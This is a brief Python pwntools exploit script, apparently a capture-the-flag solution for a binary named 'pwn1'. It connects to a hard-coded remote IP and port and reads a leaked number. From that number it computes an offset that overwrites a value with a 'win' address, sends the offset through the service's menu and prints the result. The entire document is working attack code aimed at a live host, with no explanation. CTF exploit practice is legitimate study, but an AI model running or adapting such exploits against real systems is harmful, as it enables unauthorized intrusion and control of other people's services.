from pwn import *


win = 0x08048f560000

#p = process('./pwn1')
p = remote("203.162.91.5", 6966)
p.recvuntil('Magic number: ')
n = int(p.recvline().strip(), 10)
p.recv()

t = n & 0xffff00000000ffff
t += win
add = t - n


log.info("t:   %s" %(hex(t)))
log.info("n:   %s" %(hex(n)))
log.info("add: %s" %(hex(add)))
log.info("")

p.sendline('1')
p.recvuntil('Input number to add: ')
p.sendline(str(add))

p.sendline('2')

print p.recvall()

p.close()